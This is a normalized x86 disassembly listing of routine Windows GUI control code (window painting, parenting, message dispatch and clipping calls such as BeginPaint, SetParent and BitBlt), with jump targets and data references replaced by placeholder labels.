mov si 0xffee
call sub_403420
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_43f554
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_4068bc
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_43f594
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_417880
mov eax esi
call sub_4177d0
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_4177d0
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_417888
pop esi
pop ebx
retn
sub_43f5cc
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_4190cc
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_419058
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_419058
mov eax esi
call sub_4190d4
add esp 0x10
pop esi
pop ebx
retn
sub_43f634
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_43f620
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_413918
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_413918
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_43f70c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_43d0d0
mov eax [ ebp - 0x8 ]
push eax
push sub_43f594
mov eax [ ebp - 0x8 ]
push eax
push sub_43f5cc
push ebp
call sub_43f634
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43f768
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_43bb40
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_408694
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_4086a8
mov ecx eax
mov edx edi
mov eax ebx
call sub_43bb50
mov eax r-xdata
call sub_4086b4
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_43a5f4
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_43f7c0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_43f80d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f814
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40c774
sub_43f824
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_413974
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_413918
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_43f86c
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_43f0fc
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_43f824
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_43f0c0
call sub_43b220
inc edi
dec esi
jne r-xdata
sub_43f908
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_43f924
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_413918
call sub_43f924
inc edi
dec esi
jne r-xdata
sub_43f984
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_403420
mov ebx eax
mov eax edi
call sub_43f924
mov eax edi
call sub_43fac0
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_43f9c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push sub_43fa9a
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_43cd98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_413918
call sub_43f9c4
inc esi
dec ebx
jne r-xdata
sub_43fac0
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_43f9c4
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_43fb00
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_43f924
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_43fac0
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_4068a4
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_43cd98
jmp r-xdata
sub_43fb88
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43fbe0
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_43fbcf
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fbd6
call sub_43a5f4
call sub_41ee64
retn
sub_43fc00
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_4124bc
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_40688c
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_43cd98
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_43fcb8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_413918
call sub_43fc00
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_413918
call sub_43fc00
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_43fd4c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4423cc
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406878
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_43fcb8
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_40688c
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_43cd98
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_43fde0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_43c354
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_43ce64
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_43fd4c
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406878
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_43b710
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_43fcb8
test eax eax
je r-xdata
mov eax ebx
call sub_452980
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_43ce64
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_4426d0
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_4423cc
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_4423cc
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_43cd98
sub_43ff44
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_43cff8
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_43cd98
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_41bfbc
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_41cc88
call sub_41bfbc
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_41ccc4
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_43b76c
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_44004c
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_438aac
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_43cd98
mov [ esi + 0xc ] eax
mov bl 0x1
sub_440080
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_4401a0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4401d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4401a7
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_413918
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_4401d8
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_413974
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_413918
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_4124e4
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_413918
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_41bfbc
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_4124e4
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_41bfbc
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_4124e4
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_43a508
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_43cd98
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_440408
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_43a508
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_4423cc
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_4423cc
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_43cd98
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_43cd98
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_43a508
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_440408
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_413918
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_44055c
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_440080
jmp r-xdata
mov eax ebx
call sub_43f0fc
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4406ae
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_4423cc
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_43cd98
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_44055c
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_4423cc
push eax
call EndPaint
